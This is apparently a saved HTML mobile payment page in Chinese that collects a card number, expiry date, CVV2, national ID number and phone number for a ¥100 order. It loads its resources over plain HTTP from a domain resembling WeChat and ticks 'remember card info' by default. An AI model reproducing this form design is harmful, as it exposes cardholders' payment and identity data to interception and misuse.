<html><head><title>交易信息</title><meta charset="gbk">    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">     <script type="text/javascript" src="http://cb365.wechater.cc:80/mobile/js/app.js"></script><script type="text/javascript" src="http://cb365.wechater.cc:80/mobile/js/util.js"></script>    <link rel="stylesheet" type="text/css"  href="http://cb365.wechater.cc:80/mobile/css/kbCss/style.css"/>    <script type="text/javascript" src="http://cb365.wechater.cc:80/mobile/js/jquery.js"></script> </head> <body> <div class="grey"></div><div class="gathering" ><h1>交易信息</h1><div class="blueBackground">    <span class="money">订单金额：</span>        <p style=" font-size:1.1rem;">￥<span>100.00</span></p>    </div>    <p class="bankCard" style="margin-top:18px;">请输入收款方信息：</p>    <form action="../ss/doPayCardInfo.do" name="FormPay" method="post">    <div class="xinXi"><div class="smallBox"><span>开户银行：</span><img class="sanJiao" src="http://cb365.wechater.cc:80/mobile/images/kbImg/sanjiao.png"/><select id="bankId" name="bankId" style="background:#fff;"><option value="onselect">请选择开户银行</option><option value="icbc">工商银行</option><option value="abc">农业银行</option><option  value="boc">中国银行</option><option  value="ccb">建设银行</option><option  value="bankcomm">交通银行</option><option value="cmb">招商银行</option><option value="psbc">邮政银行</option><option value="ecitic">中信银行</option><option value="pingan">平安银行</option><option value="cgbchina">广发银行</option><option value="spdb">浦发银行</option><option value="cib">兴业银行</option><option value="cebbank">光大银行</option><option value="hxb">华夏银行</option>                       <option value="cmbc">民生银行</option>   </select></div><div class="smallBox"><span>银行卡号：</span><input maxlength="20"  id="bankAcctId" name="bankAcctId" type="text" placeholder="请输入银行卡号"/></div><div class="smallBox"><span>持卡人姓名：</span><input id="bankAcctName" name="bankAcctName"  type="text" placeholder="请输入持卡人姓名"/></div><div class="smallBox"><span>有效期：</span><input id="expDate" name="expDate" type="text" placeholder="格式为月/年,如:5523"/></div><div class="smallBox"><span>CVV2：</span><input id="cvv2" name="cvv2"  type="password" placeholder="请输入CVV2,卡背面签名栏后三位"/></div><div class="smallBox"><span>证件号：</span><input  maxlength="18" id="legalCertNo" name="legalCertNo" type="text" placeholder="请输入身份证号"/></div><div class="smallBox" style=" border-bottom:none;"><span>银行预留手机号：</span><input id="bankMobile" name="bankMobile" onKeyUp="value=value.replace(/[^\d.]/g,'')" maxlength="11" type="tel" placeholder="请输入银行预留手机号"/></div></div>            <div class="getXinxi"><label><input type="checkbox" id="remember" name="remember" value="Y" checked>记住卡信息，下次可一键快捷支付</label></div>                                <input type="hidden" id="merId" name="merId" value="M1608170092354">        <input type="hidden" id="transSeqId" name="transSeqId" value="P17080114165725389">        <input type="hidden" id="credNo" name="credNo" value="141650">        <input type="hidden" id="paySrc" name="paySrc" value="nor"><input type="hidden" id="gateId" name="gateId" value="payeco"><input type="hidden" id="sysId" name="sysId" value="2000000122"><input type="hidden" id="appId" name="appId" value="">          <input  onclick="nextPhone()" class="zhiFu" type="button" value="确认支付" style="background: #2bc528;"/>     </form>    <p class="tiShi">提醒：您正在进行一笔交易,请认真核实并且确定银行卡信息不能透露给别人！</p></div> <!--弹出窗口--><div class="popdialog" id="showMsg"><div class="whiteBackgrund"><h3>提示</h3><p ><span style="display:inline-block; color:#000;">..</span></p><a href="#" class="closed" onClick="closeWin('showMsg')">确定</a></div></div><div id="waiting_form" class="win_form_div">    <img src="http://cb365.wechater.cc:80/mobile/images/loading1.gif"/><p style="color:#fff;">正在处理，请耐心等待...</p></div><div id="loading_form" class="win_form_div" style="top;0;">    <img src="http://cb365.wechater.cc:80/mobile/images/loading1.gif"/>    <p style="color:#fff; text-align:center;">正在支付，请耐心等待...</p></div>  <script type="text/javascript">function showMsg(msg){if(msg){$("#showMsg .whiteBackgrund p span").html(msg);$("#showMsg").show();}}function nextPhone(){var bankId = document.getElementById("bankId");      var bankAcctId = document.getElementById("bankAcctId");      var bankAcctName = document.getElementById("bankAcctName");      var cvv2 = document.getElementById("cvv2");      var expDate = document.getElementById("expDate");      var legalCertNo = document.getElementById("legalCertNo");      var bankMobile = document.getElementById("bankMobile");      if(bankId.value.trim()=="" || bankId.value.trim()=="onselect"){             showMsg("请选择开户银行");return false;      }if (bankAcctId.value.trim()==""){showMsg("请输入银行卡号");return false;}if(!isNum(bankAcctId.value)){showMsg("银行卡号格式不正确");return false;}if (bankAcctName.value.trim()==""){showMsg("请输入持卡人姓名");return false;}if (cvv2.value.trim()=="" || cvv2.value.length != 3){showMsg("请输入CVV2,卡背后三位");return false;}if(!isNum(cvv2.value)){showMsg("CVV2号码格式不正确");return false;}if(expDate.value.trim()=="" || expDate.value.length != 4){showMsg("请输入信用卡有效期月/年，如：0518");return false;}if(!isNum(expDate.value)){showMsg("信用卡有效期格式不正确");return false;}if (legalCertNo.value.trim()==""){showMsg("请输入证件号");return false;}if (bankMobile.value.trim()==""){showMsg("请输入银行预留手机号");return false;}if(!checkMp(bankMobile)){showMsg("手机号格式不正确");return false;}        openWin("loading_form");$(".zhiFu").attr("disabled", "disabled");$(".zhiFu").css({"background":"#c9c9c9"});document.forms[0].submit();} </script></body></html>
